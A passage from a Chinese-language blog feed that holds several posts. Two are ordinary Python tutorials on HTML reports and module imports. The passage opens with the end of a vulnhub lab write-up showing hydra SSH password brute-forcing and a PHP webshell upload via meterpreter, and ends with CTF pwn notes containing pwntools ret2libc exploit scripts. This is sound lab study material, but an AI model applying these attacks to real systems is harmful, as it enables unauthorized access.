配置文件、密码加密方式及其相关漏洞</p><p>2、msf</p><p>3、数据库</p><p>4、SUID 提权</p><h2 id="五、其他"><a href="#五、其他" class="headerlink" title="五、其他"></a>五、其他</h2><p><strong>爆破 SSH：</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">#</span><span class="bash"> -l 指定破解的用户-P 指定密码字典ssh://ip 指定使用协议和ip地址</span><br><span class="hljs-meta">$</span><span class="bash"> sudo hydra -l flag4 -P /usr/share/wordlists/rockyou.txt 192.168.135.147 ssh</span><br><span class="hljs-meta">#</span><span class="bash"> 或者</span><br><span class="hljs-meta">$</span><span class="bash"> sudo hydra -l flag4 -P /usr/share/wordlists/rockyou.txt ssh://192.168.135.147</span><br><span class="hljs-meta"></span><br><span class="hljs-meta"></span><br><span class="hljs-meta">#</span><span class="bash"> 使用得到用户名密码【flag4/orange】, 远程连接靶机</span><br><span class="hljs-meta">$</span><span class="bash"> ssh flag4@192.168.135.147</span><br><span class="hljs-meta">$</span><span class="bash"> ls</span><br><span class="hljs-meta">$</span><span class="bash"> cat flag4.txt</span><br></code></pre></td></tr></table></figure><p><strong>上传冰蝎马获取 shell</strong>：</p><p>利用 meterperter 的 shell 直接上传冰蝎的 shell：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">meterperter&gt; upload /home/kali/Desktop/shell.php /var/www/shell.php<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>Penetration</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Penetration</tag>
      
      <tag>vulnhub</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Python制作HTML报告</title>
    <link href="/2022/06/11/Code/Python/Python%E5%88%B6%E4%BD%9CHTML%E6%8A%A5%E5%91%8A/"/>
    <url>/2022/06/11/Code/Python/Python%E5%88%B6%E4%BD%9CHTML%E6%8A%A5%E5%91%8A/</url>
    
    <content type="html"><![CDATA[<h1 id="Python制作HTML报告"><a href="#Python制作HTML报告" class="headerlink" title="Python制作HTML报告"></a>Python制作HTML报告</h1><blockquote><p>原文链接：<a href="https://zhuanlan.zhihu.com/p/341869724">用Python制作一份HTML报告 - 知乎 (zhihu.com)</a></p></blockquote><p>多学习，少比比。</p><blockquote><p>本文使用 <a href="https://zhuanlan.zhihu.com/p/106057556">Zhihu On VSCode</a> 创作并发布</p></blockquote><p>刚刚写好了一个制作报告的Python程序，分享一下，也是作为自己的笔记：（几乎）没有任何前端基础，用Python制作一份HTML的数据报告。既可以做为网页发布到网站上，也可以打印成PDF。</p><h2 id="一、用Markdown制作一个网页模板"><a href="#一、用Markdown制作一个网页模板" class="headerlink" title="一、用Markdown制作一个网页模板"></a>一、用Markdown制作一个网页模板</h2><p>第一步是制作一个网页模板。如果有前端技术，当然可以用html和CSS做出一个漂亮的模板。或者也可以在网上找到合适的模板。但是我用了最简单的方法：在VScode里用Markdown写一份简单的模板，并用Markdown Preview Enhanced插件保存为html格式。也可以使用其他喜欢的Markdown笔记软件，如Typora之类的，大多有导出html的功能。所以最后html的样式就取决于这些软件的渲染结果了。</p><p>写模板的时候把需要插入文字、表格、图片等内容的地方用两层大括号 {{ }}括起来，后续插入内容。</p><p>另外，在开头插入一段plotly的源码地址，后面将会用plotly画图。例如：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs text">&lt;script src=&quot;https://cdn.plot.ly/plotly-latest.min.js&quot;&gt;&lt;/script&gt;<br><br># 报告标题<br><br>&#123;&#123; summary &#125;&#125;<br><br>## 详细数据<br><br>&#123;&#123; table &#125;&#125;<br><br>## 数据可视化<br><br>&#123;&#123; chart &#125;&#125;<br></code></pre></td></tr></table></figure><p>把这份MD文件导出为html，命名为”Template.html“，并放在Python代码的同一个文件夹下，这样模板就准备好了。</p><h2 id="二、用jinja2导入模板"><a href="#二、用jinja2导入模板" class="headerlink" title="二、用jinja2导入模板"></a>二、用jinja2导入模板</h2><blockquote><p><a href="http://docs.jinkan.org/docs/jinja2/index.html">欢迎来到 Jinja2 — Jinja2 2.7 documentation (jinkan.org)</a></p></blockquote><p><code>jinja2</code>是一个处理html的模板引擎。我只学到了一个语法，就是在模板中的 <code>&#123;&#123; &#125;&#125;</code> 用法类似于字符串的format函数。</p><p>用<code>Jinja2</code>载入模板：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> jinja2<br><br>env = jinja2.Environment(loader=jinja2.FileSystemLoader(searchpath=<span class="hljs-string">&#x27;&#x27;</span>))<br>template = env.get_template(<span class="hljs-string">&#x27;Template.html&#x27;</span>)<br><br>summary = <span class="hljs-string">u&quot;这是一些文字&quot;</span><br><br><span class="hljs-comment"># 输出数据表格的代码</span><br>table = <span class="hljs-string">u&quot;后面来制作数据表格&quot;</span><br><br><span class="hljs-comment"># 输出图表的代码</span><br>chart = <span class="hljs-string">u&quot;后面来制作图片&quot;</span><br><br><span class="hljs-comment"># 导出图片并保存</span><br><span class="hljs-comment"># 语法和format类似，‘=’前面是html模板的&#123;&#123; &#125;&#125;中的变量名，后面是要导入的内容，我喜欢用一样的名字，比较容易识别</span><br>html = template.render(summary=summary, table=table, chart=chart)<br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;Report.html&#x27;</span>, <span class="hljs-string">&#x27;w&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>        f.write(html)<br></code></pre></td></tr></table></figure><p>这样就得到了一份Report的html文件。其中的数据表格和图暂时都是用字符串代替的。接下来讲怎么插入数据和图。</p><h2 id="三、用Pandas输出表格"><a href="#三、用Pandas输出表格" class="headerlink" title="三、用Pandas输出表格"></a>三、用<code>Pandas</code>输出表格</h2><p>可以用<code>df.to_html</code>把数据表格变成html格式插入网页，还可以用<code>df.style</code>功能对数据表做一些高亮等操作。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> pandas <span class="hljs-keyword">as</span> pd<br><span class="hljs-keyword">import</span> numpy <span class="hljs-keyword">as</span> np<br><br><span class="hljs-comment"># 简单的数据表格</span><br>df = pd.DataFrame(np.random.randn(<span class="hljs-number">5</span>, <span class="hljs-number">4</span>), columns=[<span class="hljs-string">&#x27;one&#x27;</span>, <span class="hljs-string">&#x27;two&#x27;</span>, <span class="hljs-string">&#x27;three&#x27;</span>, <span class="hljs-string">&#x27;four&#x27;</span>],<br>                  index=[<span class="hljs-string">&#x27;a&#x27;</span>, <span class="hljs-string">&#x27;b&#x27;</span>, <span class="hljs-string">&#x27;c&#x27;</span>, <span class="hljs-string">&#x27;d&#x27;</span>, <span class="hljs-string">&#x27;e&#x27;</span>])<br><br><span class="hljs-comment"># 输出为html</span><br>table = df.to_html()<br></code></pre></td></tr></table></figure><h2 id="四、用plotly进行数据可视化并插入网页"><a href="#四、用plotly进行数据可视化并插入网页" class="headerlink" title="四、用plotly进行数据可视化并插入网页"></a>四、用<code>plotly</code>进行数据可视化并插入网页</h2><p><a href="https://plotly.com/python/">Plotly Python Graphing Library</a></p><p><a href="https://images.plot.ly/plotly-documentation/images/python_cheat_sheet.pdf">python_cheat_sheet.pdf (plot.ly)</a></p><p><code>plotly</code>本身就是一个交互式的数据可视化包。我们用<code>plotly.offline.plot</code>可以直接输出图片内容为网页格式。为了把图片插入到我们的报告里，我们需要plotly不要输出完整html，而只是包含数据的div。所以前面提到了把plotly的js引用加到我们的模板前面。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> plotly <span class="hljs-keyword">as</span> py<br><span class="hljs-keyword">import</span> plotly.express <span class="hljs-keyword">as</span> px<br><br><span class="hljs-comment"># 画一个箱型图。</span><br>fig = px.box(data_frame=df, x=<span class="hljs-string">&#x27;one&#x27;</span>, y=<span class="hljs-string">&#x27;two&#x27;</span>)<br>chart = py.offline.plot(fig, include_plotlyjs=<span class="hljs-literal">False</span>, output_type=<span class="hljs-string">&#x27;div&#x27;</span>)<br></code></pre></td></tr></table></figure><p>好了，现在我们可以把所有的表格和图片插入报告里了。重新运行一下前面保存文件的代码。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python">html = template.render(summary=summary, table=table, chart=chart)<br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;Report.html&#x27;</span>, <span class="hljs-string">&#x27;w&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>        f.write(html)<br></code></pre></td></tr></table></figure><p>这样，一份完整的html格式的数据报告就做好了。你可以把这份代码作为你整个数据分析pipeline的一部分，每次的分析结果都可以自动生成一份报告。</p><p><a href="https://blog.csdn.net/weixin_38037405/article/details/124323127">(5条消息) Plotly：最强Python可视化库，没有之一_我爱Python数据挖掘的博客-CSDN博客_plotly</a></p><p><a href="https://www.jianshu.com/p/57bad75139ca">python plotly 使用教程 - 简书 (jianshu.com)</a></p><p><a href="https://blog.csdn.net/zhouchen1998/article/details/108976110">(5条消息) Plotly基础教程_周先森爱吃素的博客-CSDN博客_plotly</a></p><p><a href="https://zhuanlan.zhihu.com/p/441617577">数据科学家必备｜使用jupyter生成html格式报告 - 知乎 (zhihu.com)</a></p><p><a href="https://blog.csdn.net/xuezhangjun0121/article/details/96288810">(5条消息) HTML测试报告模板_Saggitarxm的博客-CSDN博客_html报告模板</a></p>]]></content>
    
    
    <categories>
      
      <category>Python</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Python</tag>
      
      <tag>Code</tag>
      
      <tag>HTML report</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Python跨文件调用函数</title>
    <link href="/2022/06/08/Code/Python/Python%E8%B7%A8%E6%96%87%E4%BB%B6%E8%B0%83%E7%94%A8%E5%87%BD%E6%95%B0/"/>
    <url>/2022/06/08/Code/Python/Python%E8%B7%A8%E6%96%87%E4%BB%B6%E8%B0%83%E7%94%A8%E5%87%BD%E6%95%B0/</url>
    
    <content type="html"><![CDATA[<h1 id="Python跨文件调用函数"><a href="#Python跨文件调用函数" class="headerlink" title="Python跨文件调用函数"></a>Python跨文件调用函数</h1><blockquote><p>原文链接：<a href="https://blog.csdn.net/Gou_Hailong/article/details/124295301">https://blog.csdn.net/Gou_Hailong/article/details/124295301</a></p></blockquote><p>在很多时候，为了保持代码与代码文件的简洁和逻辑清晰，通常会将许多相类似的函数放在一个文件中，在一个 main.py 中去调用它们。调用 Python 函数的时候，大致会存在如下几种情况 。</p><h2 id="一、项目简介"><a href="#一、项目简介" class="headerlink" title="一、项目简介"></a>一、项目简介</h2><p>假如现在有这样一个文件树（从其他地方copy的，稍加整改）</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-string">A</span><br>   <span class="hljs-string">|--------</span> <span class="hljs-string">__init__.py</span><br>   <span class="hljs-string">|--------</span> <span class="hljs-string">a.py</span><br>   <span class="hljs-string">|--------</span> <span class="hljs-string">main.py</span><br>   <span class="hljs-string">|--------</span> <span class="hljs-string">B</span><br>         <span class="hljs-string">|--------</span> <span class="hljs-string">__init__.py</span><br>         <span class="hljs-string">|--------</span> <span class="hljs-string">b.py</span><br>   <span class="hljs-string">|--------</span> <span class="hljs-string">C</span><br>         <span class="hljs-string">|--------</span> <span class="hljs-string">__init__.py</span><br>         <span class="hljs-string">|--------</span> <span class="hljs-string">c.py</span><br></code></pre></td></tr></table></figure><p>文件内容如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># a.py</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">a_hello</span>():</span><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;A_HELLO&quot;</span>)<br>----------------------------<br><span class="hljs-comment"># b.py</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">b_hello</span>():</span><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;B_HELLO&quot;</span>)<br>----------------------------<br><span class="hljs-comment"># c.py</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">c_hello</span>():</span><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;C_HELLO&quot;</span>)<br>----------------------------<br><span class="hljs-comment"># main.py</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">main_hello</span>():</span><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;MAIN_HELLO&quot;</span>)<br></code></pre></td></tr></table></figure><p>为什么要有 <code>__init__.py</code> 文件呢？</p><p>在Python工程里，当python检测到一个目录下存在 <code>__init__.py</code> 文件时，python就会把它当成一个模块(module)。Module跟C＋＋的命名空间和 Java 的Package的概念很像，都是为了科学地组织化工程，管理命名空间。</p><p><code>__init__.py</code> 可以是一个空文件，也可以有非常丰富的内容。</p><h2 id="二、调用类型"><a href="#二、调用类型" class="headerlink" title="二、调用类型"></a>二、调用类型</h2><h3 id="1、调用同文件中的函数"><a href="#1、调用同文件中的函数" class="headerlink" title="1、调用同文件中的函数"></a>1、调用同文件中的函数</h3><p>这个比较简单，比如我想在 main.py 中调用 <code>main_hello()</code> 函数，那么我直接 <code>main_hello()</code> 即可</p><h3 id="2、调用同目录下不同文件中的函数"><a href="#2、调用同目录下不同文件中的函数" class="headerlink" title="2、调用同目录下不同文件中的函数"></a>2、调用同目录下不同文件中的函数</h3><p>比如我想在 main.py 中调用 a.py 中的 <code>a_hello()</code> 函数，可做如下操作</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> a<br>a.a_hello()<br></code></pre></td></tr></table></figure><h3 id="3、调用同级文件夹文件中的函数"><a href="#3、调用同级文件夹文件中的函数" class="headerlink" title="3、调用同级文件夹文件中的函数"></a>3、调用同级文件夹文件中的函数</h3><p>比如我想在 main.py 中调用文件夹 B 下 b.py 中的 <code>b_hello()</code> 函数，可做如下操作：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> B <span class="hljs-keyword">import</span> b<br>b.b_hello()<br></code></pre></td></tr></table></figure><h3 id="4、调用上一级文件夹文件中的函数"><a href="#4、调用上一级文件夹文件中的函数" class="headerlink" title="4、调用上一级文件夹文件中的函数"></a>4、调用上一级文件夹文件中的函数</h3><p>比如我想在 c.py 中调用 a.py 中的函数，这时候如果用上面的方法就会报错 No module named xx 。解决方法就是将目录 A 加到系统路径下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> sys<br>sys.path.append(<span class="hljs-string">&#x27;E:\\testnow\\A&#x27;</span>)   <span class="hljs-comment">#括号内容为文件的绝对路径</span><br></code></pre></td></tr></table></figure><p>注意，<code>sys.path</code> 添加目录时注意是在 windows 还是在 linux 下，windows 下需要用 <code>\\</code> ，linux 下需要用 <code>/</code> 否则会出错。这样需要区分操作系统，而且需要知道绝对路径，岂不是很不好用。看到有大佬用到过如下操作：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">import</span> sys<br>sys.path.append(os.path.abspath(os.path.join(os.path.dirname(__file__), <span class="hljs-string">&#x27;..&#x27;</span>)))<br></code></pre></td></tr></table></figure><p>上面这句话很长，但也不难理解，<code>os.path.dirname(__file__)</code> 获取当前文件的绝对路径，<code>os.path.join(xx,&#39;..&#39;)</code> 在后面追加 <code>..</code> ，相当于进入上一级目录，然后再 <code>os.path.abspath(xx)</code> 获取绝对路径，最后 <code>sys.path.append()</code> 将其加入系统路径当中。经过这些操作之后，被加入系统路径中的所有文件中的函数都可以被调用了。</p><h2 id="三、概念区分"><a href="#三、概念区分" class="headerlink" title="三、概念区分"></a>三、概念区分</h2><p>Python 模块(Module)，是一个 Python 文件，以 <code>.py</code> 结尾，包含了 Python 对象定义和 Python 语句。</p><p>Python 包是一个分层次的文件目录结构，它定义了一个由模块及子包，和子包下的子包等组成的 Python 的应用环境。简单来说，包就是文件夹，但该文件夹下必须存在 <code>__init__.py</code> 文件， 该文件的内容可以为空。<code>__init__.py</code> 用于标识当前文件夹是一个包。</p><p>文件夹：文件夹就是不存在 <code>__init__.py</code> 文件的文件夹。</p><p>另外，对于导入模块可以使用 <code>import model1</code> 或 <code>from model1 import func1, func2, ...</code> 。其实，这两种方式看似一样，但是是有所区别的，具体请看：<a href="https://blog.csdn.net/Gou_Hailong/article/details/125169752">https://blog.csdn.net/Gou_Hailong/article/details/125169752</a></p>]]></content>
    
    
    <categories>
      
      <category>Python</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Python</tag>
      
      <tag>Code</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Some Problems</title>
    <link href="/2022/05/30/CTF/Pwn/Problem/"/>
    <url>/2022/05/30/CTF/Pwn/Problem/</url>
    
    <content type="html"><![CDATA[<h1 id="Some-Problems"><a href="#Some-Problems" class="headerlink" title="Some Problems"></a>Some Problems</h1><h2 id="ret2libc1"><a href="#ret2libc1" class="headerlink" title="ret2libc1"></a>ret2libc1</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>io = process(<span class="hljs-string">&quot;./ret2libc1&quot;</span>)<br>io.recv()<br><br><span class="hljs-comment">#system_plt = 0x08048460</span><br><span class="hljs-comment">#bin_sh = 0x08048720</span><br>elf = ELF(<span class="hljs-string">&quot;./ret2libc1&quot;</span>)<br>system_plt = elf.plt[<span class="hljs-string">&quot;system&quot;</span>]<br>bin_sh = <span class="hljs-built_in">hex</span>(<span class="hljs-built_in">next</span>(elf.search(<span class="hljs-string">b&quot;/bin/sh&quot;</span>)))<br>payload = flat([<span class="hljs-string">b&#x27;A&#x27;</span>*<span class="hljs-number">112</span>, system_plt, <span class="hljs-number">0xdeadbeef</span>, bin_sh])<br><br>io.sendline(payload)<br>io.interactive()<br></code></pre></td></tr></table></figure><p>报错：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">ROP$</span><span class="bash"> python3 exp4.py</span><br>[+] Starting local process &#x27;./ret2libc1&#x27;: pid 6683<br>[*] &#x27;/home/pwn/桌面/题目/ROP/ret2libc1&#x27;<br>    Arch:     i386-32-little<br>    RELRO:    Partial RELRO<br>    Stack:    No canary found<br>    NX:       NX enabled<br>    PIE:      No PIE (0x8048000)<br>0x8048720<br>[*] Switching to interactive mode<br>[*] Got EOF while reading in interactive<br><span class="hljs-meta">$</span><span class="bash"> id</span><br>[*] Process &#x27;./ret2libc1&#x27; stopped with exit code -11 (SIGSEGV) (pid 6683)<br>[*] Got EOF while sending in interactive<br></code></pre></td></tr></table></figure><p><code>python</code> 中的函数 <code>hex()</code> 返回16进制数，以字符串形式表示。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>elf = ELF(<span class="hljs-string">&quot;./ret2libc3&quot;</span>)<br><br>a = <span class="hljs-built_in">next</span>(elf.search(<span class="hljs-string">b&quot;sh\x00&quot;</span>))<br><span class="hljs-built_in">print</span>(a)<span class="hljs-comment">#134504882</span><br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">type</span>(a))<span class="hljs-comment">#&lt;class &#x27;int&#x27;&gt;</span><br><br>b = <span class="hljs-built_in">hex</span>(<span class="hljs-built_in">next</span>(elf.search(<span class="hljs-string">b&quot;sh\x00&quot;</span>)))<br><span class="hljs-built_in">print</span>(b)<span class="hljs-comment">#0x80461b2</span><br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">type</span>(b))<span class="hljs-comment">#&lt;class &#x27;str&#x27;&gt;</span><br><br>c = <span class="hljs-number">0x10</span><br><span class="hljs-built_in">print</span>(c)<span class="hljs-comment">#16</span><br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">type</span>(<span class="hljs-number">0x10</span>))<span class="hljs-comment">#&lt;class &#x27;int&#x27;&gt;</span><br></code></pre></td></tr></table></figure><h2 id="ret2libc3"><a href="#ret2libc3" class="headerlink" title="ret2libc3"></a>ret2libc3</h2><p><code>libc</code> 版本不一致，导致打不通。</p><blockquote><p>本地：<code>libc-2.31.so</code> ，远端：<code>libc-2.23.so</code> ）</p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>io = process(<span class="hljs-string">&quot;./ret2libc3&quot;</span>)<br>elf = ELF(<span class="hljs-string">&quot;./ret2libc3&quot;</span>)<br>libc = ELF(<span class="hljs-string">&quot;./libc-2.23.so&quot;</span>)<br><br>io.sendlineafter(<span class="hljs-string">b&#x27; :&#x27;</span>, <span class="hljs-built_in">str</span>(elf.got[<span class="hljs-string">&quot;puts&quot;</span>]))<br>io.recvuntil(<span class="hljs-string">b&#x27; : &#x27;</span>)<br>libcbase = <span class="hljs-built_in">int</span>(io.recvuntil(<span class="hljs-string">b&#x27;\n&#x27;</span>, drop=<span class="hljs-literal">True</span>),<span class="hljs-number">16</span>) - libc.symbols[<span class="hljs-string">&quot;puts&quot;</span>]<br>system_got = libcbase + libc.symbols[<span class="hljs-string">&quot;system&quot;</span>]<br>payload = flat([cyclic(<span class="hljs-number">60</span>), system_got, <span class="hljs-number">0xdeadbeef</span>, <span class="hljs-built_in">next</span>(elf.search(<span class="hljs-string">b&quot;sh\x00&quot;</span>))])<br><br>io.sendlineafter(<span class="hljs-string">b&#x27; :&#x27;</span>, payload)<br>io.interactive()<br></code></pre></td></tr></table></figure><h2 id="加载指定libc版本"><a href="#加载指定libc版本" class="headerlink" title="加载指定libc版本"></a>加载指定libc版本</h2><h3 id="Method-1"><a href="#Method-1" class="headerlink" title="Method 1"></a>Method 1</h3><p>让程序强行加载特定版本 <code>glibc</code>，通过 <code>LD_LIBRARY_PATH</code> 或者 <code>LD_PRELOAD</code> 。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">io = process(<span class="hljs-string">&quot;./ret2libc3&quot;</span>,env=&#123;<span class="hljs-string">&quot;LD_PRELOAD&quot;</span>:<span class="hljs-string">&quot;./libc-2.23.so&quot;</span>&#125;)<br></code></pre></td></tr></table></figure><p>因为 <code>ld.so</code> 和 <code>libc.so</code> 不匹配的原因，如果版本差太远可能行不通。可以将配套的 <code>ld</code> 和 <code>libc</code> 一起使用即可实现动态加载 <code>libc</code> 。</p><p>在 <code>pwntools</code> 启动程序时，可以按照下面的代码进行设置。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">io = process([&quot;/home/pwn/Software/glibc-all-in-one/libs/2.23-0ubuntu11.3_i386/ld-linux.so.2&quot;, &quot;./ret2libc3&quot;], env=&#123;&quot;LD_PRELOAD&quot;:&quot;./libc-2.23.so&quot;&#125;)<br></code></pre></td></tr></table></figure><h3 id="Method-2"><a href="#Method-2" class="headerlink" title="Method 2"></a>Method 2</h3><p>用 <code>patchelf</code> 和 <code>glibc-all-in-one</code> 来解决这个问题。</p><h4 id="GitHub-地址"><a href="#GitHub-地址" class="headerlink" title="GitHub 地址"></a>GitHub 地址</h4><p>patchelf：<a href="https://github.com/NixOS/patchelf">https://github.com/NixOS/patchelf</a></p><p>glibc-all-in_one：<a href="https://github.com/matrix1001/glibc-all-in-one">https://github.com/matrix1001/glibc-all-in-one</a></p><h4 id="libc-下载"><a href="#libc-下载" class="headerlink" title="libc 下载"></a>libc 下载</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> <span class="hljs-built_in">cd</span> glibc-all-in-one</span><br><span class="hljs-meta">$</span><span class="bash"> ./update_list<span class="hljs-comment">#更新最新版本的 glibc 目录</span></span><br><span class="hljs-meta">$</span><span class="bash"> cat list <span class="hljs-comment">#查看可下载的 glibc</span></span><br><span class="hljs-meta">$</span><span class="bash"> ./download 2.23-0ubuntu11.3_i386<span class="hljs-comment">#下载想要的 glibc</span></span><br></code></pre></td></tr></table></figure><p>更多说明请进入 github 查看：<a href="https://github.com/matrix1001/glibc-all-in-one">https://github.com/matrix1001/glibc-all-in-one</a></p><h4 id="更改-elf-文件的-ld-和-libc"><a href="#更改-elf-文件的-ld-和-libc" class="headerlink" title="更改 elf 文件的 ld 和 libc"></a>更改 elf 文件的 ld 和 libc</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> ldd ret2libc3</span> <br>linux-gate.so.1 (0xf7fa6000)<br>libc.so.6 =&gt; /lib/i386-linux-gnu/libc.so.6 (0xf7da1000)<br>/lib/ld-linux.so.2 (0xf7fa7000)<br><span class="hljs-meta"></span><br><span class="hljs-meta">$</span><span class="bash"> patchelf --replace-needed libc.so.6 /home/pwn/桌面/题目/ROP/ret2libc3/libc-2.23.so ret2libc3</span>       <br><span class="hljs-meta">$</span><span class="bash"> ldd ret2libc3</span>     <br>linux-gate.so.1 (0xf7f71000)<br>/home/pwn/桌面/题目/ROP/ret2libc3/libc-2.23.so (0xf7db8000)<br>/lib/ld-linux.so.2 (0xf7f72000)<br><span class="hljs-meta"></span><br><span class="hljs-meta">$</span><span class="bash"> 